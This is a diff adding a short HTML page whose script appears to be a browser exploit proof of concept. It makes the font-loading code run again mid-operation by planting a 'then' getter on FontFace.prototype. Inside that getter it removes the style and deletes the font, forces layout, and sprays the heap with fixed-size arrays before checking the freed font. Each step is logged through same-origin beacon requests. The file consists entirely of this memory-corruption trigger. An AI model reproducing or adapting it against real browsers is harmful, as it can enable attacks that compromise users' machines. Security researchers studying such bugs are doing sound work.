@@ -1,0 +1,60 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>par3</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+var TRIAL = 0, MAXT = 2, styleEl = null, firedHere = false;
+function setup(){
+  var name = 'f' + TRIAL;
+  var A = new FontFace(name, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A);
+  void A.loaded;
+  window.__alive = window.__alive || [];
+  window.__alive.push(A);
+  styleEl = document.createElement('style');
+  styleEl.textContent = "@font-face { font-family: s" + TRIAL + "; src: url(/realfont/?ms=300); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  b('TR' + TRIAL + '-SETUP');
+  firedHere = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (firedHere) return undefined;
+      firedHere = true;
+      b('TR' + TRIAL + '-GETTER-ENTER');
+      if (styleEl) styleEl.remove();
+      b('TR' + TRIAL + '-STYLE-REMOVED');
+      try { document.fonts.delete(this); } catch (e) {}
+      b('TR' + TRIAL + '-DELETED');
+      window.__hold = window.__hold || [];
+      for (var q = 0; q < 0; q++) window.__hold.push(new Array(256).join('\u0041'));
+      document.body.offsetHeight;
+      b('TR' + TRIAL + '-LAYOUT');
+      window.__h = window.__h || [];
+      for (var q = 0; q < 2000; q++) window.__h.push(new Array(176).join('\u0000'));
+      b('CLASS192-' + window.__h.length);
+      window.__sp = [];
+      b('TR' + TRIAL + '-NOSPRAY');
+      b('TR' + TRIAL + '-SPRAYED-' + window.__sp.length);
+      var r = 'err';
+      try { r = document.fonts.check('1em s' + TRIAL); } catch (e) { r = 'throw'; }
+      b('TR' + TRIAL + '-CHECK-' + r);
+      b('TR' + TRIAL + '-RET');
+      return undefined;
+    },
+    set: function(){}
+  });
+  document.fonts.load('1em ' + name + ', s' + TRIAL, 'AB').then(
+    function(){ b('TR' + TRIAL + '-RESOLVED'); },
+    function(){ b('TR' + TRIAL + '-REJECTED'); }
+  );
+  b('TR' + TRIAL + '-LOAD-CALLED');
+  setTimeout(next, 400);
+}
+function next(){
+  TRIAL++;
+  if (TRIAL < MAXT) setTimeout(setup, 150);
+  else b('TR-DONE-all');
+}
+function run(){ b('TR-PARSE'); setup(); }
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script></head><body><p>par3</p></body></html>
